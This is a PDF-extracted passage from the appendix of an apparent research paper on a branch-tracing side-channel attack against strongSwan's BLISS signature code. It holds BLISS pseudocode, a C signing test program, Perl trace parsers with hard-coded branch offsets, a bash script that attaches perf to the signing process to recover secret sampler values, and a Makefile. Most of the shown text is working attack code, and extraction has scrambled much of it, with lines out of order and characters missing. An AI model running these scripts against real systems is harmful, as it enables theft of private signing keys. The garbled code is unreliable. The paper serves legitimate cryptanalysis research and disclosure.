Q
NQ[ζm]/Q( f ) = pα
Figure 14: Recovery of the generator f from its relative norm: Case p ≡ 3 mod 4.
19
1: function KeyGen()
2:
sample f, g ∈ R = Z[x]/(xn + 1), uniformly with ⌈δ1n⌉ coeffi-
cients in {±1}, ⌈δ2n⌉ coefficients in {±2} and 0 otherwise
S = (s1, s2)T ← (f, 2g + 1)T
if Nκ (S) ≥ C2 · 5 · (⌈δ1n⌉ + 4⌈δ2n⌉) · κ then restart
aq = (2g + 1)/f mod q (restart if f is not invertible)
return (pk = a1, sk = S) where a1 = 2aq mod 2q
3:
4:
5:
6:
7: end function
1: function Verify(µ, pk = a1, (z1, z†
2:
3:
4:
5: end function
2, c))
2 )∥2 > B2 then reject
2 )∥∞ > B∞ then reject
if ∥(z1, 2d · z†
if ∥(z1, 2d · z†
accept iff c = H (⌊ζ · a1 · z1 + ζ · q · c⌉d + z†
2 mod p, µ )
Figure 15: Description of the BLISS key generation and ver-
ification algorithms. We refer to the original paper for the
definition of notation like ζ , Nκ and ⌊·⌉d , as they are not rel-
evant for our purposes.
20
# include 
# include 
# include 
# include 
# include 
# include 
int main ( int argc , char ** argv )
{
signature_scheme_t signature_scheme ;
private_key_t * privkey ;
public_key_t * pubkey ;
chunk_t msg , signature ;
char msg_str [] = " This is a test .";
char * plugins , * plugindir ;
library_init ("" , " basic_sign ");
dbg_default_set_level ( LEVEL_DIAG );
plugins = lib -> settings -> get_str ( lib -> settings , " tests . load " , PLUGINS );
plugindir = lib -> settings -> get_str ( lib -> settings , " tests . plugindir " , PLUGINDIR );
plugin_loader_add_plugindirs ( plugindir , plugins );
lib -> plugins -> load ( lib -> plugins , plugins );
lib -> settings -> set_bool ( lib -> settings , "%s. plugins . bliss . use_bliss_b " , 0, lib -> ns );
signature_scheme = SIGN_BLISS_WITH_SHA2_256 ;
msg = chunk_from_str ( msg_str );
printf (" Generate private key .\ n");
privkey = lib -> creds -> create ( lib -> creds , CRED_PRIVATE_KEY , KEY_BLISS , BUILD_KEY_SIZE , BLISS_I , BUILD_END );
printf (" Extract public key from private key .\ n");
pubkey = privkey -> get_public_key ( privkey );
sleep (10) ;
printf (" Sign the message : \"% s \".\ n" , msg_str );
privkey -> sign ( privkey , signature_scheme , msg , & signature );
printf (" Verify the signature : ");
if ( pubkey -> verify ( pubkey , signature_scheme , msg , signature ))
printf (" ok .\ n");
else
printf (" error !\ n");
free ( signature . ptr );
privkey -> destroy ( privkey );
pubkey -> destroy ( pubkey );
library_deinit () ;
return 0;
}
Figure 16: The basic C program “basic_sign” linked against libstrongswan on which we perform branch tracing.
21
# !/ usr / bin / perl
use strict ;
use File :: stat ;
my $fh ;
my $mapfile = " basic_sign . map ";
my $data
my $script
= " perf . data ";
= " perf - script . out ";
open $fh , $mapfile or die " Cannot open map file ";
my $line = ;
$line =~ /^([0 -9 a -f ]+) -/ or die " Map file format incorrect ";
close $fh ;
my $baseaddr = hex ( $1 );
# addresses of the main branching instructions in bernoulli_exp function
my $addr_entry = sprintf "%x" , $baseaddr + 0 x66f0 ;
my $addr_loopx = sprintf "%x" , $baseaddr + 0 x67c6 ;
my $addr_testx = sprintf "%x" , $baseaddr + 0 x674d ;
my $addr_retrn = sprintf "%x" , $baseaddr + 0 x67ad ;
my $addr_sign1 = sprintf "%x" , $baseaddr + 0 x2de3 ;
my $addr_sign2 = sprintf "%x" , $baseaddr + 0 x2f51 ;
if ( -e $script and -e $data and stat ( $data ) -> mtime > stat ( $script ) -> mtime ) {
unlink $script ;
}
open $fh , $script or open $fh , " perf script -F ip , addr 2 >/ dev / null | tee $script |";
my $bit ;
my $x ;
while (  ) {
if ( / $addr_entry / ) {
print " Enter bernoulli_exp ";
if ( / $addr_sign1 / or / $addr_sign2 / ) {
print " from the sign_bliss function ";
}
print ". x = ";
$bit = 1;
$x = 0;
}
elsif ( / $addr_loopx / ) {
$x = 2* $x + $bit ;
$bit = 1;
}
elsif ( / $addr_testx / ) {
$bit = 0;
}
elsif ( / $addr_retrn / ) {
$x = 2* $x + $bit ;
print " $x . Exit bernoulli_exp .\ n";
}
}
close $fh ;
Figure 17: The perl script “parse-perfdata.pl” that parses the output of the perf command.
22
# !/ bin / bash
TARGET = basic_sign
TARGETOBJ =. libs /lt - $TARGET
TARGETOUT = $TARGET . out
PARSEFILE = parse - perfdata . out
$TARGETOBJ &> $TARGETOUT &
TARGETPID =$!
until grep 'r - xp .* bliss .so ' / proc / $TARGETPID / maps > $TARGET . map ; do
sleep 0.01;
done
echo " Running target ' $TARGET ' as PID $TARGETPID . Launching perf record ."
perf record -e branches :u -c 1 -d -p $TARGETPID 2 >/ dev / null
echo " perf record complete . Parsing perf . data ."
perl parse - perfdata . pl > $PARSEFILE
recovered_x =$( grep -F sign $PARSEFILE | tail -n 1 | grep -Eo ' [1 -9][0 -9]+ ' )
correct_sc =$( grep -F norm $TARGETOUT | tail -n 1 | grep -Eo ' [1 -9][0 -9]+ ' )
correct_m =46539
echo " Recovered x
echo " Correct | Sc |^2 : $correct_sc "
echo " Should sum to
: $correct_m "
: $recovered_x "
if [ $ (( recovered_x + correct_sc )) -eq $correct_m ]; then
echo Success !;
else
fi
echo Failure .;
Figure 18: The shell script “run_exploit_rejection” that launches the entire attack.
= basic_sign
= run_exploit_rejection
= $( HOME )/ strongswan -5.5.2
= $( STRONGSWANROOT )/ config .h
TARGET
EXPLOIT
STRONGSWANROOT
CONFIGH
LIBSTRONGSWANDIR = $( STRONGSWANROOT )/ src / libstrongswan
LIBSTRONGSWAN
PLUGINDIR
PLUGINS
= $( LIBSTRONGSWANDIR )/ libstrongswan . la
= $( LIBSTRONGSWANDIR )/ plugins
= sha2 sha1 mgf1 random gmp bliss
= -I$ ( LIBSTRONGSWANDIR ) -I$ ( LIBSTRONGSWANDIR )/ math / libnttfft
CFLAGS
CFLAGS += - include $( CONFIGH ) -g -O3
CFLAGS += - DPLUGINDIR =" \" $( PLUGINDIR ) \" " - DPLUGINS =" \" $( PLUGINS ) \" "
CFLAGS += - Wall
. PHONY : all run clean
all : $( TARGET )
run : $( TARGET )
./ $( TARGET ) 2 >/ dev / null
./ $( EXPLOIT )
clean :
rm -f $( TARGET ) $( TARGET ).o $( TARGET ). map $( TARGET ). out *~
rm -rf . libs /
rm -f parse - perfdata . out perf . data perf . data . old perf - script . out
$( TARGET ): $( TARGET ).o
libtool -- mode = link gcc -g -o $@ $^ $( LIBSTRONGSWAN )
Figure 19: Makefile for the attack. The attack can be run with “make run”.
23
# !/ usr / bin / perl
use strict ;
use File :: stat ;
my $fh ;
my $mapfile = " basic_sign . map ";
my $data
my $script
= " perf . data ";
= " perf - script . out ";
open $fh , $mapfile or die " Cannot open map file ";
my $line = ;
$line =~ /^([0 -9 a -f ]+) -/ or die " Map file format incorrect ";
close $fh ;
my $baseaddr = hex ( $1 );
my % offsets
= (
=> 0 x697e ,
gaussian_to_pos_binary
=> 0 x6a3e ,
gaussian_return_true
=> 0 x69d8 ,
gaussian_return
=> 0 x690e ,
pos_binary_for_loop
=> 0 x692c ,
pos_binary_return
bernoulli_exp_for_loop
=> 0 x67c6 ,
bernoulli_exp_return_full => 0 x67d5 ,
gaussian_to_bernoulli_exp => 0 x69f5 ,
gaussian_no_neg
=> 0 x6a56 ,
pos_binary_return_true
pos_binary_restart
bernoulli_exp_test_bit
bernoulli_exp_return
=> 0 x6934 ,
=> 0 x6906 ,
=> 0 x674d ,
=> 0 x67ad ,
);
open $fh , $script or die " Cannot open $script ";
sub nextline {
}
my $s = ;
$s =~ /^ *([0 -9 a -f ]+) => *([0 -9 a -f ]+) $/ or die " Parse error ";
my ( $source , $dest ) = ( hex ( $1 ) - $baseaddr , hex ( $2 ) - $baseaddr );
return ( $source , $dest );
sub parse_gaussian {
my ($x , $zsq , $z );
my ( $ret , $neg ) = (0 ,1) ;
print " Entering parse_gaussian .\ n";
while (1) {
my ( $source , $dest ) = nextline () ;
if ( $source == $offsets {' gaussian_to_pos_binary ' }) {
Jump to parse_pos_binary .\ n";
print "
$x = parse_pos_binary () ;
print "
Returned : x=' $x '.\n";
}
elsif ( $source == $offsets {' gaussian_to_bernoulli_exp ' }) {
Jump to parse_bernoulli_exp .\ n";
print "
$zsq = parse_bernoulli_exp () ;
print "
$zsq = $zsq + 254*254* $x * $x ;
$z
print "
Deduced : z=' $z '.\n";
= sqrt ( $zsq );
Returned : z ^2 - k ^2 x^2= ' $zsq '.\n";
}
elsif ( $source == $offsets {' gaussian_return_true ' }) {
$ret = 1;
}
elsif ( $source == $offsets {' gaussian_no_neg ' }) {
$neg = 0;
}
elsif ( $source == $offsets {' gaussian_return ' }) {
my $res = undef ;
if ( $ret ) {
$res = $neg ? -$z : $z ;
}
print " Exiting parse_gaussian with result : $res \n";
return $res ;
}
}
}
Figure 20: The perl script “parse-perfdata-gauss.pl” that parses the output of the perf command in the Gaussian sampling
attack (continues to next page).
24
sub parse_pos_binary {
my $i = 0;
while (1) {
my ( $source , $dest ) = nextline () ;
if ( $source == $offsets {' pos_binary_for_loop ' }) {
}
elsif ( $source == $offsets {' pos_binary_return_true ' }) {
$i = $i + 1;
return $i ;
return undef ;
$i = 0;
}
elsif ( $source == $offsets {' pos_binary_return ' }) {
}
elsif ( $source == $offsets {' pos_binary_restart ' }) {
}
}
}
sub parse_bernoulli_exp {
my ( $bit , $x ) = (1 ,0) ;
while (1) {
my ( $source , $dest ) = nextline () ;
if ( $source == $offsets {' bernoulli_exp_for_loop ' }) {
$x = 2* $x + $bit ;
$bit = 1;
}
elsif ( $source == $offsets {' bernoulli_exp_test_bit ' }) {
$bit = 0;
}
elsif ( $source == $offsets {' bernoulli_exp_return_full ' }) {
return 2* $x + $bit ;
}
elsif ( $source == $offsets {' bernoulli_exp_return ' }) {
return undef ;
}
}
}
for ( my $i =0; $i <1024; $i ++) {
parse_gaussian () ;
}
close $fh ;
Figure 21: The perl script “parse-perfdata-gauss.pl” that parses the output of the perf command in the Gaussian sampling
attack (continued).
25